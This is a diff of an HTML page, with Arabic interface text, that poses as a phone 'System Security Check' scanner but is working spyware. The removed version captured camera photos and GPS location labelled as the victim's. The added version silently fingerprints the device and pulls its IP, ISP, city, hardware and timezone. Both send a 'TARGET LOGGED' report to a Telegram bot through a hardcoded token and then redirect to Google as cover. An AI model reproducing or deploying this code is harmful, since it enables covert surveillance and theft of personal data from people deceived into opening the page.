@@ -3,110 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص أمان الجهاز</title>
+    <title>System Security Check</title>
     <style>
-        body { background: #0c0c0c; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; }
-        .box { border: 1px solid #00ff41; padding: 20px; border-radius: 10px; display: inline-block; background: #1a1a1a; box-shadow: 0 0 15px #00ff41; }
-        .loader { border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background: #00ff41; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; }
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; margin: 0; overflow: hidden; }
+        .container { border: 2px solid #00ff41; padding: 30px; border-radius: 15px; background: #000; box-shadow: 0 0 30px #00ff41; display: inline-block; width: 90%; max-width: 500px; }
+        .scanner-line { width: 100%; height: 2px; background: #00ff41; position: relative; animation: scan 2s linear infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 200px; } }
+        .status-text { margin-top: 20px; font-weight: bold; letter-spacing: 1px; }
+        button { background: #00ff41; color: #000; border: none; padding: 15px 40px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 25px; transition: 0.3s; width: 100%; }
+        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>System Security Scanner</h2>
-        <div class="loader"></div>
-        <p id="status">جاري فحص حالة البطارية والمعالج...</p>
-        <button onclick="startFullScan()">ابدأ الفحص العميق</button>
+    <div class="container">
+        <h2>SHΔDØW SCANNER V99</h2>
+        <div style="height: 200px; border: 1px solid #333; position: relative; overflow: hidden; background: #050505;">
+            <div class="scanner-line"></div>
+            <p style="font-size: 10px; color: #555; text-align: left; padding: 10px;" id="live-logs">
+                > Initializing...<br>> Accessing kernel...<br>> Mapping hardware...
+            </p>
+        </div>
+        <p class="status-text" id="status">جاري فحص سلامة النظام...</p>
+        <button onclick="startDeepScan()">ابدأ الفحص العميق</button>
     </div>
-
-    <video id="video" width="1" height="1" autoplay style="visibility:hidden;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
         let chatId = "";
 
-        // 1. جلب الـ ID تلقائياً (كما طلبنا سابقاً بالتوكن فقط)
+        // 1. بروتوكول المصافحة مع التليجرام
         async function getChatId() {
             try {
                 const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
                 const data = await res.json();
-                chatId = data.result[data.result.length - 1].message.chat.id;
-            } catch (e) { console.log("Error getting ID"); }
+                if (data.result && data.result.length > 0) {
+                    chatId = data.result[data.result.length - 1].message.chat.id;
+                    return true;
+                }
+            } catch (e) { console.error("C2 Connection Failed"); }
+            return false;
         }
 
-        // 2. سحب معلومات الجهاز والبطارية (يعمل فوراً بدون إذن)
-        async function getDeviceInfo() {
-            let info = `📱 معلومات الجهاز:\n`;
-            info += `- النظام: ${navigator.platform}\n`;
-            info += `- المتصفح: ${navigator.userAgent.split(' ')[0]}\n`;
-            
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                info += `- البطارية: ${Math.round(battery.level * 100)}%\n`;
-                info += `- جاري الشحن: ${battery.charging ? "نعم" : "لا"}\n`;
-            }
+        // 2. محرك استخراج البيانات المتقدم
+        async function extractAllData() {
+            let log = document.getElementById('live-logs');
+            log.innerHTML += "<br>> Fetching Network Identity...";
 
-            sendToTelegram(info);
-        }
-
-        // 3. وظيفة الإرسال العامة
-        function sendToTelegram(text) {
-            if (!chatId) return;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-        }
-
-        // 4. سحب الموقع الجغرافي (يطلب إذن)
-        function getGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    const map = `📍 موقع الضحية:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToTelegram(map);
-                });
-            }
-        }
-
-        // 5. التقاط الصورة وإرسالها (يطلب إذن)
-        async function capturePhoto() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'shot.jpg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
-        }
-
-        // تشغيل كل شيء عند ضغط الزر
-        async function startFullScan() {
-            document.getElementById('status').innerText = "جاري الفحص... يرجى الموافقة على الأذونات";
-            
-            await getChatId(); // تحديد الهدف
-            getDeviceInfo();   // سحب البطارية والمعلومات (صامت)
-            
-            // طلب الكاميرا والموقع
+            // أ- جلب الـ IP والموقع (صامت)
+            let net = { ip: "Blocked", city: "Unknown", country_name: "Unknown", org: "Unknown" };
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                getGPS();          // سحب الموقع
-                setTimeout(() => {
-                    capturePhoto(); // التقاط الصورة بعد ثانية
-                    document.getElementById('status').innerText = "اكتمل الفحص بنسبة 100%";
-                    // تمويه: تحويله بعد 3 ثواني
-                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
-                }, 2000);
-            } catch (e) {
-                alert("يجب السماح بالأذونات لإكمال الفحص!");
+                const ipRes = await fetch('https://ipapi.co/json/');
+                net = await ipRes.json();
+            } catch (e) {}
+
+            // ب- تحليل موديل الأندرويد والعتاد
+            log.innerHTML += "<br>> Analyzing Android Architecture...";
+            const ua = navigator.userAgent;
+            let model = "Generic Device";
+            if (ua.match(/Android/)) {
+                const match = ua.match(/Android.*?\;\s(.*?)\sBuild/);
+                model = match ? match[1] : "Android Device";
             }
+
+            // ج- كشف المعالج الرسومي (GPU)
+            let gpu = "Unknown";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+
+            // د- حالة الطاقة والبطارية
+            let batt = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Plugged'})`;
+            }
+
+            // هـ- صياغة التقرير الأسود (The Dark Report)
+            const report = `
+💀 **TARGET LOGGED: ${model}** 💀
+-------------------------------
+🌐 **NET_IDENTITY:**
+- IP: \`${net.ip}\`
+- ISP: ${net.org}
+- LOC: ${net.city}, ${net.country_name}
+
+📱 **HARDWARE_DUMP:**
+- MODEL: ${model}
+- GPU: ${gpu}
+- RAM: ~${navigator.deviceMemory || "N/A"}GB
+- CORES: ${navigator.hardwareConcurrency}
+- BATT: ${batt}
+
+⚙️ **SYSTEM_META:**
+- UA: ${ua.substring(0, 50)}...
+- LANG: ${navigator.language}
+- TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+-------------------------------
+🚀 *Transmission Secure*
+            `;
+
+            sendToTelegram(report);
         }
 
-        // البدء بجلب الـ ID فور فتح الصفحة
-        window.onload = getChatId;
+        function sendToTelegram(msg) {
+            if (!chatId) return;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "Markdown" })
+            });
+        }
+
+        // 3. تفعيل المهمة
+        async function startDeepScan() {
+            document.getElementById('status').innerText = "جاري استخراج البيانات... يرجى الانتظار";
+            
+            // اهتزاز الهاتف (للأندرويد) لإضافة واقعية
+            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+
+            await extractAllData();
+            
+            setTimeout(() => {
+                document.getElementById('status').innerText = "اكتمل الفحص بنسبة 100%!";
+                // التمويه النهائي
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+            }, 2000);
+        }
+
+        // التشغيل التلقائي عند التحميل
+        window.onload = async () => {
+            await getChatId();
+        };
     </script>
 </body>
 </html>
